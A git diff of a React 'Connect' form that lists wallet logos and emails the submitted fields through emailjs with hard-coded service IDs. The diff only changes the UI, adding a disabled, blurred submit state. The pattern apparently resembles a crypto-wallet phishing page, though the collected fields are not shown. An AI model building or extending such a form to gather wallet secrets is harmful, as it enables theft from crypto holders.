@@ -3,12 +3,14 @@ import { Usewallet } from "../context/Usewallet";
 
 function Form() {
   const { setFormVisible, walletArray } = Usewallet();
+  const { inActive, setInActive } = Usewallet(false);
 
   const [active, setActive] = useState(1);
   const form = useRef();
 
   const sendEmail = (e) => {
     e.preventDefault();
+    setInActive(true);
 
     emailjs
       .sendForm("service_x41o8tj", "template_168l8hs", form.current, {
@@ -33,13 +35,13 @@ function Form() {
             {!walletArray
               ? ""
               : walletArray.map((wallet) => (
-                  <p key={wallet.id}>
+                  <span key={wallet.id}>
                     <img
                       src={wallet.imageUrl}
                       className="h-8 w-8"
                       alt="wallet.name"
                     />
-                  </p>
+                  </span>
                 ))}
           </span>
           <span className="mb-4 text-center text-xl font-bold">
@@ -134,11 +136,15 @@ function Form() {
             </>
           )}
           <div className="mt-5 flex gap-4">
-            <input
+            <button
               type="submit"
-              value="Connect"
-              className="mx-auto block w-[70%] cursor-pointer rounded bg-blue-500 py-2 text-center text-white md:px-4 md:pt-3 "
-            />
+              disabled={inActive}
+              className={`mx-auto ${inActive ? "blur" : ""} block w-[70%]  ${
+                inActive ? "cursor-wait" : "cursor-pointer"
+              } rounded bg-blue-500 py-2 text-center text-white md:px-4 md:pt-3 `}
+            >
+              Connect
+            </button>
             <p
               onClick={() => setFormVisible(false)}
               className=" w-[30%] cursor-pointer rounded bg-red-500 py-2 text-center text-white md:px-4 md:pt-3 "
